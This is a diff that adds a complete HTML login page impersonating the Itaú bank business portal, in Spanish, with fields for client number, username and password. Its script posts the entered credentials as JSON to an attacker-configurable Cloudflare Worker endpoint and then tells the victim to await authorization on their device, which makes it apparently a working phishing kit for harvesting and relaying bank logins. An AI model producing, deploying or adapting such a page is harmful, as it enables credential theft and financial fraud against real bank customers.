@@ -1,0 +1,432 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#06143f">
+<title>Itaú - Acceso</title>
+<style>
+:root{
+  --navy:#06143f;
+  --orange:#ff5b00;
+  --blue:#006b91;
+  --text:#555;
+  --border:#d2d2d2;
+}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#fff;color:var(--text)}
+body{min-height:100vh}
+
+/* CABECERA */
+.header{
+  height:149px;background:var(--navy);position:relative;
+  display:flex;align-items:flex-start;padding:24px 48px
+}
+.logo{
+  width:95px;height:95px;background:#fff;border-radius:18px;
+  display:flex;align-items:center;justify-content:center;
+  color:var(--navy);font-size:36px;font-weight:700;letter-spacing:-2px
+}
+.top-login{
+  position:absolute;left:50%;top:31px;transform:translateX(-50%);
+  width:255px;height:85px;border:2px solid #fff;border-radius:25px;
+  color:#fff;display:flex;align-items:center;justify-content:center;
+  font-size:28px;font-weight:700
+}
+.close{
+  position:absolute;right:35px;top:19px;width:50px;height:50px;
+  cursor:pointer
+}
+.close:before,.close:after{
+  content:"";position:absolute;left:24px;top:7px;height:39px;width:4px;background:#fff
+}
+.close:before{transform:rotate(45deg)}
+.close:after{transform:rotate(-45deg)}
+.search{
+  position:absolute;right:125px;top:54px;width:38px;height:38px;
+  border:4px solid #fff;border-radius:50%
+}
+.search:after{
+  content:"";position:absolute;width:18px;height:4px;background:#fff;
+  right:-13px;bottom:-7px;transform:rotate(45deg)
+}
+.menu{position:absolute;right:49px;top:56px;width:38px}
+.menu i{display:block;height:4px;background:#fff;margin:8px 0}
+.pointer{
+  position:absolute;bottom:-1px;left:50%;transform:translateX(-50%);
+  width:0;height:0;border-left:20px solid transparent;
+  border-right:20px solid transparent;border-bottom:20px solid #fff
+}
+
+/* CONTENIDO */
+.content{
+  width:min(100% - 80px, 640px);
+  margin:0 auto;
+  padding:69px 0 70px
+}
+.select,.field{
+  width:100%;height:99px;border-radius:18px;background:#fff;
+  border:2px solid var(--border);padding:0 40px;
+  font-size:29px;color:#999;display:flex;align-items:center
+}
+.select{
+  border-color:#666;position:relative;margin-bottom:95px
+}
+.chevron{
+  position:absolute;right:38px;top:34px;width:23px;height:23px;
+  border-right:3px solid #555;border-bottom:3px solid #555;
+  transform:rotate(45deg)
+}
+.field{margin-bottom:49px}
+.field input{
+  width:100%;height:100%;border:0;outline:0;background:transparent;
+  font:inherit;color:#555
+}
+.field input::placeholder{color:#999}
+.field input:focus{
+  border-color:var(--orange);
+}
+.btn{
+  width:100%;height:119px;border:0;border-radius:18px;
+  background:var(--orange);color:#fff;font-size:29px;font-weight:700;
+  cursor:pointer;
+  transition: opacity 0.3s;
+}
+.btn:hover:not(:disabled) {
+  opacity: 0.9;
+}
+.btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+.btn.loading {
+  opacity: 0.7;
+  cursor: wait;
+}
+.links{
+  font-size:28px;color:var(--blue);margin-top:24px;line-height:1.5
+}
+.links div{margin-bottom:22px;cursor:pointer}
+.links div:hover{text-decoration:underline}
+.note{
+  font-size:12px;color:#777;text-align:center;margin-top:30px
+}
+
+/* Mensajes de estado */
+#status-message {
+  margin: 20px 0;
+  padding: 15px 20px;
+  border-radius: 12px;
+  display: none;
+  font-size: 16px;
+  text-align: center;
+}
+#status-message.success {
+  display: block;
+  background: #d4edda;
+  color: #155724;
+  border: 1px solid #c3e6cb;
+}
+#status-message.error {
+  display: block;
+  background: #f8d7da;
+  color: #721c24;
+  border: 1px solid #f5c6cb;
+}
+#status-message.loading {
+  display: block;
+  background: #d1ecf1;
+  color: #0c5460;
+  border: 1px solid #bee5eb;
+}
+
+/* TABLET */
+@media (max-width:900px){
+  .header{height:125px;padding:18px 30px}
+  .logo{width:82px;height:82px;font-size:31px;border-radius:16px}
+  .top-login{top:24px;width:220px;height:76px;font-size:25px}
+  .close{right:24px;top:14px}
+  .search{right:92px;top:45px;transform:scale(.9)}
+  .menu{right:28px;top:47px;transform:scale(.9)}
+  .content{width:min(100% - 56px,600px);padding-top:55px}
+  .select,.field{height:88px;font-size:25px}
+  .select{margin-bottom:65px}
+  .field{margin-bottom:32px}
+  .btn{height:100px;font-size:26px}
+  .links{font-size:24px}
+}
+
+/* MÓVIL */
+@media (max-width:600px){
+  .header{
+    height:92px;
+    padding:13px 16px;
+  }
+  .logo{
+    width:66px;height:66px;border-radius:14px;
+    font-size:26px;letter-spacing:-1.5px
+  }
+  .top-login{
+    left:50%;top:18px;
+    width:148px;height:56px;
+    border-radius:17px;font-size:20px
+  }
+  .close{
+    right:10px;top:11px;width:34px;height:34px
+  }
+  .close:before,.close:after{
+    left:16px;top:4px;height:28px;width:3px
+  }
+  .search{
+    right:59px;top:32px;width:25px;height:25px;
+    border-width:3px
+  }
+  .search:after{
+    width:12px;height:3px;right:-9px;bottom:-5px
+  }
+  .menu{
+    right:14px;top:30px;width:25px
+  }
+  .menu i{height:3px;margin:5px 0}
+  .pointer{
+    border-left-width:14px;border-right-width:14px;border-bottom-width:14px
+  }
+
+  .content{
+    width:calc(100% - 32px);
+    max-width:none;
+    padding:45px 0 40px
+  }
+  .select,.field{
+    height:62px;
+    border-radius:12px;
+    padding:0 22px;
+    font-size:18px
+  }
+  .select{
+    margin-bottom:57px
+  }
+  .chevron{
+    right:22px;top:20px;width:15px;height:15px;border-width:2px
+  }
+  .field{margin-bottom:28px}
+  .btn{
+    height:76px;border-radius:12px;
+    font-size:21px
+  }
+  .links{
+    margin-top:18px;
+    font-size:18px;
+    line-height:1.45
+  }
+  .links div{margin-bottom:17px}
+  .note{font-size:10px;margin-top:25px}
+  #status-message {
+    font-size: 14px;
+    padding: 12px 15px;
+  }
+}
+
+/* TELÉFONOS MUY PEQUEÑOS */
+@media (max-width:380px){
+  .header{height:82px;padding:10px 12px}
+  .logo{width:58px;height:58px;font-size:23px}
+  .top-login{top:15px;width:132px;height:50px;font-size:18px}
+  .search{right:51px;top:28px}
+  .menu{right:10px;top:26px}
+  .content{width:calc(100% - 24px);padding-top:35px}
+  .select,.field{height:57px;font-size:16px}
+  .select{margin-bottom:45px}
+  .field{margin-bottom:22px}
+  .btn{height:68px;font-size:19px}
+  .links{font-size:16px}
+  #status-message {
+    font-size: 12px;
+    padding: 10px 12px;
+  }
+}
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="logo">itaú</div>
+  <div class="top-login">Ingresar</div>
+  <div class="close" aria-hidden="true" onclick="window.location.reload()"></div>
+  <div class="search" aria-hidden="true"></div>
+  <div class="menu" aria-hidden="true"><i></i><i></i><i></i></div>
+  <div class="pointer" aria-hidden="true"></div>
+</header>
+
+<main class="content">
+  <div class="select">
+    Empresas
+    <span class="chevron"></span>
+  </div>
+
+  <div class="field">
+    <input id="dni" aria-label="RUT/No. Cliente" placeholder="RUT/No. Cliente" type="text">
+  </div>
+  <div class="field">
+    <input id="usuario" aria-label="Usuario" placeholder="Usuario" type="text">
+  </div>
+  <div class="field">
+    <input id="clave" aria-label="Contraseña" placeholder="Contraseña" type="password">
+  </div>
+
+  <button id="loginBtn" class="btn">Ingresar</button>
+
+  <!-- Contenedor para mensajes de estado -->
+  <div id="status-message"></div>
+
+  <div class="links">
+    <div onclick="alert('Función en desarrollo')">Adherirse a Itaú/Link Empresa ›</div>
+    <div onclick="alert('Función en desarrollo')">Olvidé mi contraseña ›</div>
+  </div>
+
+  <div class="note">Sistema de autenticación seguro</div>
+</main>
+
+<script>
+// Configuración - CAMBIA ESTA URL POR LA DE TU WORKER
+const WORKER_URL = 'https://tu-worker.workers.dev'; // 👈 Reemplaza con tu URL
+
+// Función para generar un ID único (transactionId)
+function generateTransactionId() {
+  return 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+}
+
+// Función para mostrar mensajes de estado
+function showStatus(message, type = 'loading') {
+  const statusDiv = document.getElementById('status-message');
+  statusDiv.textContent = message;
+  statusDiv.className = type;
+}
+
+// Función para ocultar mensajes de estado
+function hideStatus() {
+  const statusDiv = document.getElementById('status-message');
+  statusDiv.className = '';
+  statusDiv.style.display = 'none';
+}
+
+// Función principal de login
+async function handleLogin() {
+  const dni = document.getElementById('dni').value.trim();
+  const usuario = document.getElementById('usuario').value.trim();
+  const clave = document.getElementById('clave').value.trim();
+  const loginBtn = document.getElementById('loginBtn');
+
+  // Validar campos
+  if (!dni || !usuario || !clave) {
+    showStatus('⚠️ Por favor, completa todos los campos', 'error');
+    return;
+  }
+
+  // Deshabilitar botón durante la petición
+  loginBtn.disabled = true;
+  loginBtn.classList.add('loading');
+  loginBtn.textContent = 'Procesando...';
+
+  // Generar transactionId
+  const transactionId = generateTransactionId();
+
+  try {
+    showStatus('🔄 Enviando datos de autenticación...', 'loading');
+
+    const response = await fetch(`${WORKER_URL}/login`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        dni: dni,
+        usuario: usuario,
+        clave: clave,
+        transactionId: transactionId
+      })
+    });
+
+    const data = await response.json();
+
+    if (response.ok && data.ok) {
+      // Éxito - mostrar mensaje
+      showStatus('✅ Datos enviados correctamente. Espera la autorización en tu dispositivo.', 'success');
+      
+      // Limpiar campos después del éxito
+      setTimeout(() => {
+        document.getElementById('dni').value = '';
+        document.getElementById('usuario').value = '';
+        document.getElementById('clave').value = '';
+      }, 1000);
+
+      // Opcional: redirigir o mostrar otra acción
+      // window.location.href = '/dashboard';
+    } else {
+      // Error del servidor
+      showStatus(`❌ Error: ${data.error || 'Error al procesar la solicitud'}`, 'error');
+    }
+  } catch (error) {
+    console.error('Error en la petición:', error);
+    showStatus('❌ Error de conexión. Verifica tu conexión a internet.', 'error');
+  } finally {
+    // Rehabilitar botón
+    loginBtn.disabled = false;
+    loginBtn.classList.remove('loading');
+    loginBtn.textContent = 'Ingresar';
+  }
+}
+
+// Event Listeners
+document.addEventListener('DOMContentLoaded', function() {
+  const loginBtn = document.getElementById('loginBtn');
+  const inputs = document.querySelectorAll('input');
+
+  // Click en botón
+  loginBtn.addEventListener('click', handleLogin);
+
+  // Enter en cualquier input
+  inputs.forEach(input => {
+    input.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        handleLogin();
+      }
+    });
+  });
+
+  // Ocultar mensajes al empezar a escribir
+  inputs.forEach(input => {
+    input.addEventListener('focus', function() {
+      hideStatus();
+    });
+  });
+
+  console.log('🚀 Sistema de autenticación listo');
+  console.log(`📡 Worker URL: ${WORKER_URL}`);
+});
+
+// Prevenir envío por defecto en formularios
+document.querySelector('form')?.addEventListener('submit', (e) => e.preventDefault());
+
+// Función para probar la conexión con el Worker
+async function testWorkerConnection() {
+  try {
+    const response = await fetch(`${WORKER_URL}/health`);
+    const data = await response.json();
+    console.log('✅ Conexión con Worker exitosa:', data);
+    return true;
+  } catch (error) {
+    console.error('❌ Error conectando con Worker:', error);
+    showStatus('⚠️ No se pudo conectar con el servidor de autenticación', 'error');
+    return false;
+  }
+}
+
+// Probar conexión al cargar (opcional)
+// Descomentar para probar automáticamente
+// testWorkerConnection();
+</script>
+
+</body>
+</html>
